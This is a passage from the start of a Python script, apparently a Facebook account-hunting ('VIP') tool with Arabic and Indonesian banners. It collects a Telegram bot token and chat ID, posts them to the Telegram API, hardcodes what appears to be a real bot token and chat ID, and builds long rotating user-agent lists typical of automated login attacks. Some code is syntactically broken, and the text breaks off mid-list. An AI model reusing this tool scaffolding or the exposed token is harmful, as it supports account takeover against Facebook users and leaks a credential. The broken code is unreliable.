import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
try:

        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:

	Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print('\x1b[38;5;205m لاتنسى صور صيد  تـم تشغيل  ')
print('\n')
token=input(f'{B} TOKEN {F} • {Y} تــوڪـن{R}→  ' +F) 
print('')
print('')
ID=input(f'  {F}I{F}D{B}  • {B}ايــدي {F}→  \033[2;36m ')
AVIP=f'\n - 🫶 قام شخص بتشغيل اداتك \n✵┈─┈─┈──𓆩@𓆪─┈─┈─┈─✵\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة \n ID  »»  {ID} \n -\ntoken  »»  {token} \n ✵┈─┈─┈──𓆩@𓆪─┈─┈─┈─✵ '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(AVIP))
os.system('clear')
A = f'''tg://openmessage?user_id={ID}'''

print(f''''\x1b[38;5;228m
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⡀⠀⢀⡴⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⢀⣠⠞⠁
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿⢟⣻⣾⣿⠁⠀⠀⠀⠀⢀⣀⣤⣤⣶⣾⣿⣿⠁⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⣫⣷⣿⠏⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⠟⠛⠫⣵⣿⣿⣿⣷⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠿⠛⠻⣵⣾⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠈⠉⠉⠉⠙⠃⠀⠀⢠⣿⣿⣿⣿⡏⠀⠀⠀⣿⡿⠿⠛⣿⣿⣿⣿⣿⠁⣠⠀⠀⠀⠘⠉⠉⠉⠉⠃⠀⠀⠀⣼⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣶⣿⣿⣿⡿⠏⠀⡀⠀⠀⠀⠀⠀⢀⣿⣿⡿⣛⣵⠟⠁⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣴⣾⣿⣿⣿⠟⠁⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡯⣅⡴⠊⠀⠀⠀⠀⠀⢀⣾⣟⣽⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⢥⣠⠖⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠉⢙⣿⢟⣫⣾⣿⡅⠀⠀⠀⠀⠀⡴⢋⣶⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⣻⡿⣫⣷⣿⡏⠀⠀⠀⠀
⠀⣤⣶⣶⣦⣤⠀⠀⡤⢚⣵⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⠁⠀⠀⠀⠀⢠⣴⣶⣦⣤⡀⠀⢠⠜⣱⣿⣿⣿⣿⠇⠀⠀⠀⠀
⠀⣿⣿⣿⣿⡿⣶⣤⣶⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⢗⣦⣴⣾⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀
⠀⠘⠿⢟⣩⣿⣿⣿⣿⣿⡿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠈⠻⡿⣫⣶⣿⣿⣿⣿⣿⠿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⡠⠶⠛⠋⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⣀⠴⠞⠛⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀     
''')

print(' ') 
os.system('clear')

os.system('clear')
print(f"""\033[32m

——————————————
•  المبࢪمج ¹𓆩♔𓆪ȷІ⎽ɹ̤ᒧᓄ  @k6_vk

🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦⬜⬜⬜🟦
🟦🟦🟦🟦🟦⬜⬜🟦🟦
🟦🟦🟦🟦🟦⬜⬜🟦🟦
🟦🟦🟦🟦⬜⬜⬜⬜🟦
🟦🟦🟦🟦🟦⬜⬜🟦🟦
🟦🟦🟦🟦🟦⬜⬜🟦🟦
🟦🟦🟦🟦🟦⬜⬜🟦🟦
🟦🟦🟦🟦🟦⬜⬜🟦🟦
  \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 المـبرمج     :  ¹𓆩♔𓆪ȷІ⎽ɹ̤ᒧᓄ VIP
 𝙐𝙎𝙀𝙍 𝙩𝙚𝙡𝙚::  @DDS73
 𝑻𝑶𝑶𝑳𝑺 : \033[1;36m 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲-𝑽𝑰𝑷\033[1;37m
 Tool Type : \033[1;31mصيـد فيسبوك VIP\033[1;37m
 Version   : \033[1;36m1.1\033[1;37m
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
——————————————
¹𓆩♔𓆪ȷІ⎽ɹ̤ᒧᓄ VIP 2.0
——————————————
 جــــاري الــــتــــحـــمــيـل     
 """)
print('\n')
token=('7097361149:AAEFcWGKkSv1yo35qXReclTUsJ7VUd8vNJ8')
print('\n')
ID=('5539618337')
cetak(nel('\t• Sedang Menginstall Modul Requests •'))
os.system('clear')
pretty.install()
CON=sol() 
ua =['Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36]']
ua = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.4 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.6 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5.2 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.41', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36', 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/16.5 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; 